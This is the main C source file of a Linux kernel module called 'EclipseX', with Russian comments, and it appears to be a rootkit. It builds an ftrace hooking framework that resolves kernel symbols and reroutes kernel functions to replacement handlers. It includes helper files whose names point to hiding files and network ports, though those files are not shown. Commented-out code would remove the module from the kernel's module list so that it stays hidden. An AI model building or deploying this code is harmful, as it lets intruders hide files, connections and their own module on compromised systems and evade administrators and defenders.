#define pr_fmt(fmt) "EclipseX: " fmt

#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
#include <linux/uaccess.h>		// взаимодействие с пространством пользователя
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/version.h>
#include <linux/module.h>

#include "resources/hooks.h"
#include "resources/hide_files_functions.c"

#include "resources/getdents.c"
#include "resources/stat.c"

#include "resources/openx.c"	
#include "resources/ports.c"


MODULE_LICENSE("GPL");

int debug_lvl = 0;
module_param(debug_lvl, int, 0600);
MODULE_PARM_DESC(debug_lvl, "Debug level 0/1");

// Функция поиска адреса системной функции
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) {
		return 0;
	}

	retval = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
	return fregs;
}
#endif

/*
 * 2 метода предотвращения рекурсии:
 * - По адресу возврата функции (USE_FENTRY_OFFSET = 0)
 * - Пропускает вызов ftrace (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long)hook->function;
#else
	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
#endif
}

// Функция установки хука
int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}
	
    pr_info("hook install %s\n", hook->name);

	return 0;
}

// Функция удаления хука
void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

// Функция установки хуков
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0; i < count; i++) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto error;
	}

	return 0;

error:
	while (i != 0) {
		fh_remove_hook(&hooks[--i]);
	}

	return err;
}

// Функция удаления хуков
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}

// на подумать
#ifndef CONFIG_X86_64
#error Currently only x86_64 architecture is supported
#endif

// Отключение оптимизации для корректного обнаружения рекурсии
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// скрывание модуля
// static struct list_head *prev_module;
// static short hidden = 0;

static int ex_init(void)
{
	int err;
    pr_info("module init\n");

	// скрывание модуля
	// prev_module = THIS_MODULE->list.prev;
	// list_del(&THIS_MODULE->list);
    // hidden = 1;

	err = fh_install_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));
	if (err)
		return err;

	pr_info("module loaded\n");

	return 0;
}

static void ex_exit(void)
{
    pr_info("module exit\n");

	// скрывание модуля
	// list_add(&THIS_MODULE->list, prev_module);
    // hidden = 0;

	fh_remove_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));

	pr_info("module unloaded\n");
}

module_init(ex_init);
module_exit(ex_exit);